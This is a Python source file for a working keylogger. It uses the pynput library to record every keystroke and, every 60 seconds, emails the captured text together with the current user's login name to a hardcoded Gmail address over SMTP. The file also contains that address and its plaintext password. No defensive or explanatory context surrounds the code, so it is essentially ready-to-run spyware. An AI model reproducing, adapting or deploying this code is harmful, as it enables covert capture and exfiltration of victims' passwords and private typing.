#!/usr/bin/env python3

import getpass
import ssl
import time
from email.message import EmailMessage  # For constructing emails
from smtplib import SMTP, SMTP_SSL
from threading import Timer

from pynput.keyboard import Listener  # Import the keyboard related functions


class Keylogger(object):
    # Class attributes
    sender, receiver = ('mayaoffsetmatrix@gmail.com', 'mayaoffsetmatrix@gmail.com')
    ssl_context = ssl.create_default_context()  # Recommended by python for a secure SSL communication

    def __init__(self, _time_interval, _email_username, _password):
        self.char = ''  # Variable for capturing pressed characters
        self.interval = _time_interval
        self.email = _email_username
        self.pwd = _password

        # Construct email message with headers and more details
        # Get the username of current user and time of saved log and insert them in the subject header
        self.full_mail_message = EmailMessage()
        self.full_mail_message['Subject'] = f'[{time.asctime()}] Key logger update from "{getpass.getuser()}":'
        self.full_mail_message['From'] = Keylogger.sender
        self.full_mail_message['To'] = Keylogger.receiver

    def key_press_cb(self, key):
        with open('key_log-output', 'a', buffering=-1, encoding='utf-8') as fd:
            try:
                self.char += str(key.char)
            except AttributeError:  # Special keys can't be changed to strings
                if key == key.space:
                    self.char += ' '
                else:  # Other special keys like tab should remain as is
                    self.char += f' [{str(key)}] '

    def store_logged_keys(self):
        # Save collected characters from 'char' in the email message body; Only when there's sth to SEND
        if self.char:
            self.full_mail_message.set_content(self.char)
            self.send_email(message=self.full_mail_message)
            self.char = ''  # Empty typed_char variable for next pass
        else:
            pass

        # Create timer obj to always "store logged keys" after specified interval
        timer = Timer(self.interval, self.store_logged_keys)
        timer.daemon = True  # make daemon such that it terminates with the main thread.
        timer.start()

    def send_email(self, message=None):
        with SMTP_SSL('smtp.gmail.com', 465, context=Keylogger.ssl_context) as mail_server:  # Use SSL SMTP conn
            # mail_server.starttls()  # Add layer of encryption
            mail_server.login(self.email, self.pwd)
            mail_server.send_message(self.full_mail_message)
            print(f'[{time.ctime()}]: Mail sent successfully!')

    def begin_keylogger(self):
        try:
            with Listener(on_press=self.key_press_cb) as key_logger:
                self.store_logged_keys()
                key_logger.join()
        except KeyboardInterrupt:
            print("\nUser pressed Ctrl+C.")


if __name__ == '__main__':
    user = 'mayaoffsetmatrix@gmail.com'
    password = '?20scared#?'
    my_logger = Keylogger(60, user, password)
    my_logger.begin_keylogger()
